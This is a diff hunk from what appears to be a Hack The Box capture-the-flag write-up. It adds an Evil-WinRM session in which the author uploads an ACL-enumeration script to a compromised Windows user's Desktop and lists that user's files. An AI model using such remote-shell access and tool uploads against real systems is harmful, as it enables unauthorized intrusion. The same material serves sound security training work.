@@ -704,3 +704,27 @@ support\support
 *Evil-WinRM* PS C:\Users\support\Documents>
 
 ```
+
+
+``` powershell
+
+*Evil-WinRM* PS C:\Users\support\Desktop> upload ../../scripts/aclenum.cs
+
+Info: Uploading /home/joel/hacking/ctf/htb/easy/support/scripts/aclenum.cs to C:\Users\support\Desktop\aclenum.cs
+
+Data: 592 bytes of 592 bytes copied
+
+Info: Upload successful!
+*Evil-WinRM* PS C:\Users\support\Desktop> ls
+
+
+    Directory: C:\Users\support\Desktop
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+-a----          8/6/2026  10:38 AM            446 aclenum.cs
+-ar---          8/6/2026   9:18 AM             34 user.txt
+
+
+```
